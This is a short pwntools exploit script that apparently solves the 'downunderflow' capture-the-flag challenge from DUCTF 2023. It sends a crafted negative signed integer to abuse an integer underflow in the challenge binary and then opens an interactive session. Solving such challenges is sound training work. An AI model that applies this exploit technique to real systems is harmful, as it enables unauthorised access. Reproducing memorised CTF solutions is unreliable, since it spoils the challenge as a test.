#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./downunderflow", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 2023.ductf.dev 30025"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

idx = 7
idx |= 0x1 << 31

payload = u32(p32(idx), signed=True)
io.sendline(str(payload).encode())

io.interactive()
